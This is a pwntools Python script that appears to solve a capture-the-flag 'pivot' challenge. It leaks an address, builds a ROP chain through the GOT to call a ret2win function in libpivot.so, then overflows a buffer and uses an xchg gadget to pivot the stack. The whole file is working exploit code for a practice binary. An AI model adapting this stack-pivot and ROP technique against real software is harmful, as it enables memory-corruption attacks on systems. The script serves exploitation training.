from pwn import *
target=process('./pivot')
lib=ELF('./libpivot.so')
elf=ELF('./pivot')
libc=elf.libc
print(target.recvuntil("pivot: "))
leak=target.recvline().strip("\n")
addr=int(leak,16)
print(hex(addr))
print(target.recvuntil("there\n> "))

foothold_got=0x602048
foothold_plt=0x400850
movraxRAX=0x400b05
poprax=0x400b00
addraxrbp=0x400b09
poprbp=0x400900
callrax=0x40098e
offset=lib.symbols["ret2win"]-lib.symbols["foothold_function"]

#call foothold_function to populate GOT
payload=p64(foothold_plt)
payload+=p64(poprax)
payload+=p64(foothold_got)
payload+=p64(movraxRAX)
payload+=p64(poprbp)
payload+=p64(offset)
payload+=p64(addraxrbp)
payload+=p64(callrax)

target.sendline(payload)

print(target.recvuntil("smash\n> "))
payload="A"*40

xhgraxrsp=0x400b02
payload+=p64(poprax)
payload+=p64(addr)
payload+=p64(xhgraxrsp)

target.sendline(payload)

target.interactive()

